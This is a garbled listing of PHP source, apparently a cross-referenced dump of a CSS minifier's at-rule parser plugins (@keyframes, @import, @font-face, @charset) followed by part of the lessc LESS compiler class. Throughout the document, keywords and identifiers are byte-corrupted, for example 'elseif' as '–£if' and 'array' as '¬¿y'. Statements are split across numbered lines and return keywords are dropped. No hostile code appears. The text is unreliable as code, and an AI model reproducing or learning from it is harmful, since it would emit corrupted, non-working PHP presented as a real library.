	`ş—rBufãr
();

4578  
$šdex
 + 15;

4581 
	`–£if
 (
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 18)) === "@-webkit-keyframes")

4583 
$this
->
©RuËName
 = "-webkit-keyframes";

4584 
$this
->
·r£r
->
	`pushS‹
("T_AT_KEYFRAMES::NAME");

4585 
$this
->
·r£r
->
	`ş—rBufãr
();

4586  
$šdex
 + 18;

4589 
	`–£if
 (
$ch¬
 ==ğ"{" && 
$¡©e
 === "T_AT_KEYFRAMES::NAME")

4591 
$Çme
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
("{\"'");

4592 
$this
->
·r£r
->
	`£tS‹
("T_AT_KEYFRAMES_RULESETS");

4593 
$this
->
·r£r
->
	`ş—rBufãr
();

4594 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtKeyäamesS¹Tok’
(
$Çme
, $this->
©RuËName
));

4597 ià(
$ch¬
 ==ğ"," && 
$¡©e
 === "T_AT_KEYFRAMES_RULESETS")

4599 
$this
->
£ËùÜs
[] = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(",{");

4602 
	`–£if
 (
$ch¬
 ==ğ"{" && 
$¡©e
 === "T_AT_KEYFRAMES_RULESETS")

4604 ià(
$this
->
·r£r
->
	`g‘Bufãr
() !== "")

4606 
$this
->
£ËùÜs
[] = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(",{");

4607 
$this
->
·r£r
->
	`pushS‹
("T_AT_KEYFRAMES_RULESET");

4608 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtKeyäamesRuË£tS¹Tok’
($this->
£ËùÜs
));

4609 
$this
->
£ËùÜs
 = 
	`¬¿y
();

4613 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_KEYFRAMES_RULESET")

4615 
$this
->
·r£r
->
	`pushS‹
("T_AT_KEYFRAMES_RULESET_DECLARATION");

4616 
$this
->
bufãr
 = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(":;", 
Œue
);

4619 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_KEYFRAMES_RULESET_DECLARATION")

4622 ià(
$this
->
bufãr
 === "filter")

4624  
çl£
;

4626 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": UÁ”mš©ed @keyäame ruË£ˆdeş¬©iÚ", 
$this
->
bufãr
 . ":" . $this->
·r£r
->
	`g‘Bufãr
() . "_"));

4629 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"}"è&& 
$¡©e
 === "T_AT_KEYFRAMES_RULESET_DECLARATION")

4631 
$v®ue
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
(";}");

4632 ià(
	`¡¹Şow”
(
	`sub¡r
(
$v®ue
, -10, 10)) === "!important")

4634 
$v®ue
 = 
	`Œim
(
	`sub¡r
($value, 0, -10));

4635 
$isImpÜÁ
 = 
Œue
;

4639 
$isImpÜÁ
 = 
çl£
;

4641 
$this
->
·r£r
->
	`pİS‹
();

4642 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtKeyäamesRuË£tDeş¬©iÚTok’
($this->
bufãr
, 
$v®ue
, 
$isImpÜÁ
));

4644 ià(
$ch¬
 === "}")

4646 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtKeyäamesRuË£tEndTok’
());

4647 
$this
->
·r£r
->
	`pİS‹
();

4649 
$this
->
bufãr
 = "";

4652 
	`–£if
 (
$ch¬
 ==ğ"}" && 
$¡©e
 === "T_AT_KEYFRAMES_RULESET")

4654 
$this
->
·r£r
->
	`ş—rBufãr
();

4656 
$this
->
·r£r
->
	`pİS‹
();

4657 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtKeyäamesRuË£tEndTok’
());

4660 
	`–£if
 (
$ch¬
 ==ğ"}" && 
$¡©e
 === "T_AT_KEYFRAMES_RULESETS")

4662 
$this
->
·r£r
->
	`ş—rBufãr
();

4663 
$this
->
·r£r
->
	`pİS‹
();

4664 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtKeyäamesEndTok’
());

4668  
çl£
;

4670  
Œue
;

4671 
	}
}

4684 şas 
	cCssAtKeyäamesEndTok’
 
ex‹nds
 
	maCssAtBlockEndTok’


4699 şas 
	cCssAtImpÜtTok’
 
ex‹nds
 
	maCssTok’


4706 
public
 
	m$ImpÜt
 = "";

4712 
public
 
	m$MedŸTy³s
 = 
¬¿y
();

4720 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$impÜt
, 
$medŸTy³s
)

4722 
$this
->
ImpÜt
 = 
$impÜt
;

4723 
$this
->
MedŸTy³s
 = 
$medŸTy³s
 ? $medŸTy³ : 
	`¬¿y
();

4730 
public
 
funùiÚ
 
	$__toSŒšg
()

4732  "@impÜˆ\"" . 
$this
->
ImpÜt
 . "\"" . (
	`couÁ
($this->
MedŸTy³s
è> 0 ? " " . 
	`im¶ode
(",", $this->MediaTypes) : ""). ";";

4733 
	}
}

4748 şas 
	cCssAtImpÜtP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


4755 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

4757  
	`¬¿y
("@", ";", ",", "\n");

4764 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

4766  
	`¬¿y
("T_DOCUMENT", "T_AT_IMPORT");

4767 
	}
}

4776 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

4778 ià(
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 7)) === "@import")

4780 
$this
->
·r£r
->
	`pushS‹
("T_AT_IMPORT");

4781 
$this
->
·r£r
->
	`ş—rBufãr
();

4782  
$šdex
 + 7;

4784 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"\n"è&& 
$¡©e
 === "T_AT_IMPORT")

4786 
$this
->
bufãr
 = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(";");

4787 
$pos
 = 
çl£
;

4788 
	`fÜ—ch
 (
	`¬¿y
(")", "\"", "'"è
as
 
$ÃedË
)

4790 ià((
$pos
 = 
	`¡¼pos
(
$this
->
bufãr
, 
$ÃedË
)è!=ğ
çl£
)

4795 
$impÜt
 = 
	`sub¡r
(
$this
->
bufãr
, 0, 
$pos
 + 1);

4796 ià(
	`¡ros
(
$impÜt
, "url(") === 0)

4798 
$impÜt
 = 
	`sub¡r
($import, 4, -1);

4800 
$impÜt
 = 
	`Œim
($import, " \t\n\r\0\x0B'\"");

4801 
$medŸTy³s
 = 
	`¬¿y_f‹r
(
	`¬¿y_m­
("Œim", 
	`ex¶ode
(",", 
	`Œim
(
	`sub¡r
(
$this
->
bufãr
, 
$pos
 + 1), " \t\n\r\0\x0B{"))));

4802 ià(
$pos
)

4804 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtImpÜtTok’
(
$impÜt
, 
$medŸTy³s
));

4808 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": Inv®id @impÜˆ©-ruË syÁax", 
$this
->
·r£r
->
bufãr
));

4810 
$this
->
·r£r
->
	`pİS‹
();

4814  
çl£
;

4816  
Œue
;

4817 
	}
}

4830 şas 
	cCssAtFÚtFaûS¹Tok’
 
ex‹nds
 
	maCssAtBlockS¹Tok’


4837 
public
 
funùiÚ
 
	$__toSŒšg
()

4841 
	}
}

4856 şas 
	cCssAtFÚtFaûP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


4863 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

4865  
	`¬¿y
("@", "{", "}", ":", ";");

4872 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

4874  
	`¬¿y
("T_DOCUMENT", "T_AT_FONT_FACE::PREPARE", "T_AT_FONT_FACE", "T_AT_FONT_FACE_DECLARATION");

4875 
	}
}

4884 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

4887 ià(
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 10)) === "@font-face")

4889 
$this
->
·r£r
->
	`pushS‹
("T_AT_FONT_FACE::PREPARE");

4890 
$this
->
·r£r
->
	`ş—rBufãr
();

4891  
$šdex
 + 10;

4894 
	`–£if
 (
$ch¬
 ==ğ"{" && 
$¡©e
 === "T_AT_FONT_FACE::PREPARE")

4896 
$this
->
·r£r
->
	`£tS‹
("T_AT_FONT_FACE");

4897 
$this
->
·r£r
->
	`ş—rBufãr
();

4898 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtFÚtFaûS¹Tok’
());

4901 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_FONT_FACE")

4903 
$this
->
·r£r
->
	`pushS‹
("T_AT_FONT_FACE_DECLARATION");

4904 
$this
->
bufãr
 = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(":", 
Œue
);

4907 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_FONT_FACE_DECLARATION")

4910 ià(
$this
->
bufãr
 === "filter")

4912  
çl£
;

4914 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": UÁ”mš©ed @fÚt-çû deş¬©iÚ", 
$this
->
bufãr
 . ":" . $this->
·r£r
->
	`g‘Bufãr
() . "_"));

4917 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"}"è&& 
$¡©e
 === "T_AT_FONT_FACE_DECLARATION")

4919 
$v®ue
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
(";}");

4920 ià(
	`¡¹Şow”
(
	`sub¡r
(
$v®ue
, -10, 10)) === "!important")

4922 
$v®ue
 = 
	`Œim
(
	`sub¡r
($value, 0, -10));

4923 
$isImpÜÁ
 = 
Œue
;

4927 
$isImpÜÁ
 = 
çl£
;

4929 
$this
->
·r£r
->
	`pİS‹
();

4930 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtFÚtFaûDeş¬©iÚTok’
($this->
bufãr
, 
$v®ue
, 
$isImpÜÁ
));

4931 
$this
->
bufãr
 = "";

4933 ià(
$ch¬
 === "}")

4935 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtFÚtFaûEndTok’
());

4936 
$this
->
·r£r
->
	`pİS‹
();

4940 
	`–£if
 (
$ch¬
 ==ğ"}" && 
$¡©e
 === "T_AT_FONT_FACE")

4942 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtFÚtFaûEndTok’
());

4943 
$this
->
·r£r
->
	`ş—rBufãr
();

4944 
$this
->
·r£r
->
	`pİS‹
();

4948  
çl£
;

4950  
Œue
;

4951 
	}
}

4964 şas 
	cCssAtFÚtFaûEndTok’
 
ex‹nds
 
	maCssAtBlockEndTok’


4979 şas 
	cCssAtFÚtFaûDeş¬©iÚTok’
 
ex‹nds
 
	maCssDeş¬©iÚTok’


4994 şas 
	cCssAtCh¬£tTok’
 
ex‹nds
 
	maCssTok’


5001 
public
 
	m$Ch¬£t
 = "";

5008 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$ch¬£t
)

5010 
$this
->
Ch¬£t
 = 
$ch¬£t
;

5017 
public
 
funùiÚ
 
	$__toSŒšg
()

5019  "@ch¬£ˆ" . 
$this
->
Ch¬£t
 . ";";

5020 
	}
}

5035 şas 
	cCssAtCh¬£tP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


5042 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

5044  
	`¬¿y
("@", ";", "\n");

5051 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

5053  
	`¬¿y
("T_DOCUMENT", "T_AT_CHARSET");

5054 
	}
}

5063 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

5065 ià(
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 8)) === "@charset")

5067 
$this
->
·r£r
->
	`pushS‹
("T_AT_CHARSET");

5068 
$this
->
·r£r
->
	`ş—rBufãr
();

5069  
$šdex
 + 8;

5071 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"\n"è&& 
$¡©e
 === "T_AT_CHARSET")

5073 
$ch¬£t
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
(";");

5074 
$this
->
·r£r
->
	`pİS‹
();

5075 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtCh¬£tTok’
(
$ch¬£t
));

5079  
çl£
;

5081  
Œue
;

5082 
	}
}

	@includes/libraries/class-lessc.php

1 <?
php


40 şas 
	cËssc
 {

41 
public
 
	m$VERSION
 = "v0.4.0";

43 
public
 
	m$TRUE
 = 
¬¿y
("keyword", "true");

44 
public
 
	m$FALSE
 = 
¬¿y
("keyword", "false");

46 
´Ùeùed
 
	m$libFunùiÚs
 = 
¬¿y
();

47 
´Ùeùed
 
	m$»gi¡”edV¬s
 = 
¬¿y
();

48 
´Ùeùed
 
	m$´e£rveComm’ts
 = 
çl£
;

50 
public
 
	m$vP»fix
 = '@';

51 
public
 
	m$mP»fix
 = '$';

52 
public
 
	m$·»ÁS–eùÜ
 = '&';

54 
public
 
	m$impÜtDi§bËd
 = 
çl£
;

55 
public
 
	m$impÜtDœ
 = '';

57 
´Ùeùed
 
	m$numb”P»cisiÚ
 = 
nuÎ
;

59 
´Ùeùed
 
	m$®lP¬£dFes
 = 
¬¿y
();

63 
´Ùeùed
 
	m$sourûP¬£r
 = 
nuÎ
;

64 
´Ùeùed
 
	m$sourûLoc
 = 
nuÎ
;

66 
´Ùeùed
 
	m$ÃxtImpÜtId
 = 0;

69 
´Ùeùed
 
funùiÚ
 
	$fšdImpÜt
(
$u¾
) {

70 
	`fÜ—ch
 ((
¬¿y
)
$this
->
impÜtDœ
 
as
 
$dœ
) {

71 
$fuÎ
 = 
$dœ
.(
	`sub¡r
($dœ, -1è!ğ'/' ? '/' : '').
$u¾
;

72 ià(
$this
->
	`feExi¡s
(
$fe
 = 
$fuÎ
.'.less') || $this->fileExists($file = $full)) {

73  
$fe
;

77  
nuÎ
;

80 
´Ùeùed
 
funùiÚ
 
	$feExi¡s
(
$Çme
) {

81  
	`is_fe
(
$Çme
);

82 
	}
}

84 
public
 
funùiÚ
 
	$com´essLi¡
(
$™ems
, 
$d–im
) {

85 ià(!
	`is£t
(
$™ems
[1]) && isset($items[0]))  $items[0];

86  
	`¬¿y
('li¡', 
$d–im
, 
$™ems
);

87 
	}
}

89 
public
 
funùiÚ
 
	$´eg_quÙe
(
$wh©
) {

90  
	`´eg_quÙe
(
$wh©
, '/');

91 
	}
}

93 
´Ùeùed
 
funùiÚ
 
	$ŒyImpÜt
(
$impÜtP©h
, 
$·»ÁBlock
, 
$out
) {

94 ià(
$impÜtP©h
[0] == "function" && $importPath[1] == "url") {

95 
$impÜtP©h
 = 
$this
->
	`æ©‹nLi¡
($importPath[2]);

98 
$¡r
 = 
$this
->
	`cÛrûSŒšg
(
$impÜtP©h
);

99 ià(
$¡r
 ==ğ
nuÎ
è 
çl£
;

101 
$u¾
 = 
$this
->
	`compeV®ue
($this->
	`lib_e
(
$¡r
));

104 ià(
	`sub¡r_com·»
(
$u¾
, '.css', -4, 4è==ğ0è 
çl£
;

106 
$»®P©h
 = 
$this
->
	`fšdImpÜt
(
$u¾
);

108 ià(
$»®P©h
 ==ğ
nuÎ
è 
çl£
;

110 ià(
$this
->
impÜtDi§bËd
) {

111  
	`¬¿y
(
çl£
, "/* import disabled */");

114 ià(
	`is£t
(
$this
->
®lP¬£dFes
[
	`»®·th
(
$»®P©h
)])) {

115  
	`¬¿y
(
çl£
, 
nuÎ
);

118 
$this
->
	`addP¬£dFe
(
$»®P©h
);

119 
$·r£r
 = 
$this
->
	`makeP¬£r
(
$»®P©h
);

120 
$roÙ
 = 
$·r£r
->
	`·r£
(
	`fe_g‘_cÚ‹Ás
(
$»®P©h
));

123 
	`fÜ—ch
 (
$roÙ
->
´İs
 
as
 
$´İ
) {

124 ià(
$´İ
[0] == "block") {

125 
$´İ
[1]->
·»Á
 = 
$·»ÁBlock
;

132 
	`fÜ—ch
 (
$roÙ
->
chd»n
 
as
 
$chdName
 => 
$chd
) {

133 ià(
	`is£t
(
$·»ÁBlock
->
chd»n
[
$chdName
])) {

134 
$·»ÁBlock
->
chd»n
[
$chdName
] = 
	`¬¿y_m”ge
(

135 
$·»ÁBlock
->
chd»n
[
$chdName
],

136 
$chd
);

138 
$·»ÁBlock
->
chd»n
[
$chdName
] = 
$chd
;

142 
$pi
 = 
	`·thšfo
(
$»®P©h
);

143 
$dœ
 = 
$pi
["dirname"];

145 
	`li¡
(
$tİ
, 
$bÙtom
èğ
$this
->
	`sÜtPrİs
(
$roÙ
->
´İs
, 
Œue
);

146 
$this
->
	`compeImpÜ‹dPrİs
(
$tİ
, 
$·»ÁBlock
, 
$out
, 
$·r£r
, 
$dœ
);

148  
	`¬¿y
(
Œue
, 
$bÙtom
, 
$·r£r
, 
$dœ
);

149 
	}
}

151 
´Ùeùed
 
funùiÚ
 
	$compeImpÜ‹dPrİs
(
$´İs
, 
$block
, 
$out
, 
$sourûP¬£r
, 
$impÜtDœ
) {

152 
$ŞdSourûP¬£r
 = 
$this
->
sourûP¬£r
;

154 
$ŞdImpÜt
 = 
$this
->
impÜtDœ
;

157 
$this
->
impÜtDœ
 = (
¬¿y
)$this->importDir;

158 
	`¬¿y_unshiá
(
$this
->
impÜtDœ
, 
$impÜtDœ
);

160 
	`fÜ—ch
 (
$´İs
 
as
 
$´İ
) {

161 
$this
->
	`compePrİ
(
$´İ
, 
$block
, 
$out
);

164 
$this
->
impÜtDœ
 = 
$ŞdImpÜt
;

165 
$this
->
sourûP¬£r
 = 
$ŞdSourûP¬£r
;

166 
	}
}

189 
´Ùeùed
 
funùiÚ
 
	$compeBlock
(
$block
) {

190 
$block
->
ty³
) {

192 
$this
->
	`compeRoÙ
(
$block
);

194 
nuÎ
:

195 
$this
->
	`compeCSSBlock
(
$block
);

198 
$this
->
	`compeMedŸ
(
$block
);

201 
$Çme
 = "@" . 
$block
->
Çme
;

202 ià(!
	`em±y
(
$block
->
v®ue
)) {

203 
$Çme
 .ğ" " . 
$this
->
	`compeV®ue
($this->
	`»duû
(
$block
->
v®ue
));

206 
$this
->
	`compeNe¡edBlock
(
$block
, 
	`¬¿y
(
$Çme
));

209 
$this
->
	`throwE¼Ü
("unknown blockype: $block->type\n");

211 
	}
}

213 
´Ùeùed
 
funùiÚ
 
	$compeCSSBlock
(
$block
) {

214 
$’v
 = 
$this
->
	`pushEnv
();

216 
$£ËùÜs
 = 
$this
->
	`compeS–eùÜs
(
$block
->
gs
);

217 
$’v
->
£ËùÜs
 = 
$this
->
	`muÉlyS–eùÜs
(
$£ËùÜs
);

218 
$out
 = 
$this
->
	`makeOuutBlock
(
nuÎ
, 
$’v
->
£ËùÜs
);

220 
$this
->
scİe
->
chd»n
[] = 
$out
;

221 
$this
->
	`compePrİs
(
$block
, 
$out
);

223 
$block
->
scİe
 = 
$’v
;

224 
$this
->
	`pİEnv
();

225 
	}
}

227 
´Ùeùed
 
funùiÚ
 
	$compeMedŸ
(
$medŸ
) {

228 
$’v
 = 
$this
->
	`pushEnv
(
$medŸ
);

229 
$·»ÁScİe
 = 
$this
->
	`medŸP¬’t
($this->
scİe
);

231 
$qu”y
 = 
$this
->
	`compeMedŸQu”y
($this->
	`muÉlyMedŸ
(
$’v
));

233 
$this
->
scİe
 = $this->
	`makeOuutBlock
(
$medŸ
->
ty³
, 
	`¬¿y
(
$qu”y
));

234 
$·»ÁScİe
->
chd»n
[] = 
$this
->
scİe
;

236 
$this
->
	`compePrİs
(
$medŸ
, $this->
scİe
);

238 ià(
	`couÁ
(
$this
->
scİe
->
lšes
) > 0) {

239 
$ÜphªS––eùÜs
 = 
$this
->
	`fšdClo£¡S–eùÜs
();

240 ià(!
	`is_nuÎ
(
$ÜphªS––eùÜs
)) {

241 
$Üphª
 = 
$this
->
	`makeOuutBlock
(
nuÎ
, 
$ÜphªS––eùÜs
);

242 
$Üphª
->
lšes
 = 
$this
->
scİe
->lines;

243 
	`¬¿y_unshiá
(
$this
->
scİe
->
chd»n
, 
$Üphª
);

244 
$this
->
scİe
->
lšes
 = 
	`¬¿y
();

248 
$this
->
scİe
 = $this->scİe->
·»Á
;

249 
$this
->
	`pİEnv
();

250 
	}
}

252 
´Ùeùed
 
funùiÚ
 
	$medŸP¬’t
(
$scİe
) {

253 !
	`em±y
(
$scİe
->
·»Á
)) {

254 ià(!
	`em±y
(
$scİe
->
ty³
) && $scope->type != "media") {

257 
$scİe
 = $scİe->
·»Á
;

260  
$scİe
;

261 
	}
}

263 
´Ùeùed
 
funùiÚ
 
	$compeNe¡edBlock
(
$block
, 
$£ËùÜs
) {

264 
$this
->
	`pushEnv
(
$block
);

265 
$this
->
scİe
 = $this->
	`makeOuutBlock
(
$block
->
ty³
, 
$£ËùÜs
);

266 
$this
->
scİe
->
·»Á
->
chd»n
[] = $this->scope;

268 
$this
->
	`compePrİs
(
$block
, $this->
scİe
);

270 
$this
->
scİe
 = $this->scİe->
·»Á
;

271 
$this
->
	`pİEnv
();

272 
	}
}

274 
´Ùeùed
 
funùiÚ
 
	$compeRoÙ
(
$roÙ
) {

275 
$this
->
	`pushEnv
();

276 
$this
->
scİe
 = $this->
	`makeOuutBlock
(
$roÙ
->
ty³
);

277 
$this
->
	`compePrİs
(
$roÙ
, $this->
scİe
);

278 
$this
->
	`pİEnv
();

279 
	}
}

281 
´Ùeùed
 
funùiÚ
 
	$compePrİs
(
$block
, 
$out
) {

282 
	`fÜ—ch
 (
$this
->
	`sÜtPrİs
(
$block
->
´İs
è
as
 
$´İ
) {

283 
$this
->
	`compePrİ
(
$´İ
, 
$block
, 
$out
);

285 
$out
->
lšes
 = 
$this
->
	`dedu¶iÿ‹
($out->lines);

286 
	}
}

293 
´Ùeùed
 
funùiÚ
 
	$dedu¶iÿ‹
(
$lšes
) {

294 
$unique
 = 
	`¬¿y
();

295 
$comm’ts
 = 
	`¬¿y
();

297 
	`fÜ—ch
(
$lšes
 
as
 
$lše
) {

298 ià(
	`¡½os
(
$lše
, '/*') === 0) {

299 
$comm’ts
[] = 
$lše
;

302 ià(!
	`š_¬¿y
(
$lše
, 
$unique
)) {

303 
$unique
[] = 
$lše
;

305 
	`¬¿y_¥liû
(
$unique
, 
	`¬¿y_£¬ch
(
$lše
, $unique), 0, 
$comm’ts
);

306 
$comm’ts
 = 
	`¬¿y
();

308  
	`¬¿y_m”ge
(
$unique
, 
$comm’ts
);

309 
	}
}

311 
´Ùeùed
 
funùiÚ
 
	$sÜtPrİs
(
$´İs
, 
$¥l™
 = 
çl£
) {

312 
$v¬s
 = 
	`¬¿y
();

313 
$impÜts
 = 
	`¬¿y
();

314 
$Ùh”
 = 
	`¬¿y
();

315 
$¡ack
 = 
	`¬¿y
();

317 
	`fÜ—ch
 (
$´İs
 
as
 
$´İ
) {

318 
$´İ
[0]) {

320 
$¡ack
[] = 
$´İ
;

323 
$¡ack
[] = 
$´İ
;

324 ià(
	`is£t
(
$´İ
[1][0]è&& $´İ[1][0] =ğ
$this
->
vP»fix
) {

325 
$v¬s
 = 
	`¬¿y_m”ge
($v¬s, 
$¡ack
);

327 
$Ùh”
 = 
	`¬¿y_m”ge
($Ùh”, 
$¡ack
);

329 
$¡ack
 = 
	`¬¿y
();

332 
$id
 = 
£lf
::
$ÃxtImpÜtId
++;

333 
$´İ
[] = 
$id
;

334 
$¡ack
[] = 
$´İ
;

335 
$impÜts
 = 
	`¬¿y_m”ge
($impÜts, 
$¡ack
);

336 
$Ùh”
[] = 
	`¬¿y
("impÜt_mixš", 
$id
);

337 
$¡ack
 = 
	`¬¿y
();

340 
$¡ack
[] = 
$´İ
;

341 
$Ùh”
 = 
	`¬¿y_m”ge
($Ùh”, 
$¡ack
);

342 
$¡ack
 = 
	`¬¿y
();

346 
$Ùh”
 = 
	`¬¿y_m”ge
($Ùh”, 
$¡ack
);

348 ià(
$¥l™
) {

349  
	`¬¿y
(
	`¬¿y_m”ge
(
$v¬s
, 
$impÜts
), 
$Ùh”
);

351  
	`¬¿y_m”ge
(
$v¬s
, 
$impÜts
, 
$Ùh”
);

353 
	}
}

355 
´Ùeùed
 
funùiÚ
 
	$compeMedŸQu”y
(
$qu”›s
) {

356 
$compedQu”›s
 = 
	`¬¿y
();

357 
	`fÜ—ch
 (
$qu”›s
 
as
 
$qu”y
) {

358 
$·¹s
 = 
	`¬¿y
();

359 
	`fÜ—ch
 (
$qu”y
 
as
 
$q
) {

360 
$q
[0]) {

362 
$·¹s
[] = 
	`im¶ode
(" ", 
	`¬¿y_¦iû
(
$q
, 1));

365 ià(
	`is£t
(
$q
[2])) {

366 
$·¹s
[] = "($q[1]: " .

367 
$this
->
	`compeV®ue
($this->
	`»duû
(
$q
[2])) . ")";

369 
$·¹s
[] = "($q[1])";

373 
$·¹s
[] = 
$this
->
	`compeV®ue
($this->
	`»duû
(
$q
));

378 ià(
	`couÁ
(
$·¹s
) > 0) {

379 
$compedQu”›s
[] = 
	`im¶ode
("‡nd ", 
$·¹s
);

383 
$out
 = "@media";

384 ià(!
	`em±y
(
$·¹s
)) {

385 
$out
 .= " " .

386 
	`im¶ode
(
$this
->
fÜm©‹r
->
£ËùÜS•¬©Ü
, 
$compedQu”›s
);

388  
$out
;

389 
	}
}

391 
´Ùeùed
 
funùiÚ
 
	$muÉlyMedŸ
(
$’v
, 
$chdQu”›s
 = 
nuÎ
) {

392 ià(
	`is_nuÎ
(
$’v
) ||

393 !
	`em±y
(
$’v
->
block
->
ty³
) && $env->block->type != "media")

395  
$chdQu”›s
;

399 ià(
	`em±y
(
$’v
->
block
->
ty³
)) {

400  
$this
->
	`muÉlyMedŸ
(
$’v
->
·»Á
, 
$chdQu”›s
);

403 
$out
 = 
	`¬¿y
();

404 
$qu”›s
 = 
$’v
->
block
->
qu”›s
;

405 ià(
	`is_nuÎ
(
$chdQu”›s
)) {

406 
$out
 = 
$qu”›s
;

408 
	`fÜ—ch
 (
$qu”›s
 
as
 
$·»Á
) {

409 
	`fÜ—ch
 (
$chdQu”›s
 
as
 
$chd
) {

410 
$out
[] = 
	`¬¿y_m”ge
(
$·»Á
, 
$chd
);

415  
$this
->
	`muÉlyMedŸ
(
$’v
->
·»Á
, 
$out
);

416 
	}
}

418 
´Ùeùed
 
funùiÚ
 
	$ex·ndP¬’tS–eùÜs
(&
$g
, 
$»¶aû
) {

419 
$·¹s
 = 
	`ex¶ode
("$&$", 
$g
);

420 
$couÁ
 = 0;

421 
	`fÜ—ch
 (
$·¹s
 
as
 &
$·¹
) {

422 
$·¹
 = 
	`¡r_»¶aû
(
$this
->
·»ÁS–eùÜ
, 
$»¶aû
, $·¹, 
$c
);

423 
$couÁ
 +ğ
$c
;

425 
$g
 = 
	`im¶ode
(
$this
->
·»ÁS–eùÜ
, 
$·¹s
);

426  
$couÁ
;

427 
	}
}

429 
´Ùeùed
 
funùiÚ
 
	$fšdClo£¡S–eùÜs
() {

430 
$’v
 = 
$this
->
’v
;

431 
$£ËùÜs
 = 
nuÎ
;

432 
$’v
 !=ğ
nuÎ
) {

433 ià(
	`is£t
(
$’v
->
£ËùÜs
)) {

434 
$£ËùÜs
 = 
$’v
->
£ËùÜs
;

437 
$’v
 = $’v->
·»Á
;

440  
$£ËùÜs
;

441 
	}
}

445 
´Ùeùed
 
funùiÚ
 
	$muÉlyS–eùÜs
(
$£ËùÜs
) {

448 
$·»ÁS–eùÜs
 = 
$this
->
	`fšdClo£¡S–eùÜs
();

449 ià(
	`is_nuÎ
(
$·»ÁS–eùÜs
)) {

451 
	`fÜ—ch
 (
$£ËùÜs
 
as
 &
$s
) {

452 
$this
->
	`ex·ndP¬’tS–eùÜs
(
$s
, "");

455  
$£ËùÜs
;

458 
$out
 = 
	`¬¿y
();

459 
	`fÜ—ch
 (
$·»ÁS–eùÜs
 
as
 
$·»Á
) {

460 
	`fÜ—ch
 (
$£ËùÜs
 
as
 
$chd
) {

461 
$couÁ
 = 
$this
->
	`ex·ndP¬’tS–eùÜs
(
$chd
, 
$·»Á
);

464 ià(
$couÁ
 > 0) {

465 
$out
[] = 
	`Œim
(
$chd
);

467 
$out
[] = 
	`Œim
(
$·»Á
 . ' ' . 
$chd
);

472  
$out
;

473 
	}
}

476 
´Ùeùed
 
funùiÚ
 
	$compeS–eùÜs
(
$£ËùÜs
) {

477 
$out
 = 
	`¬¿y
();

479 
	`fÜ—ch
 (
$£ËùÜs
 
as
 
$s
) {

480 ià(
	`is_¬¿y
(
$s
)) {

481 
	`li¡
(, 
$v®ue
èğ
$s
;

482 
$out
[] = 
	`Œim
(
$this
->
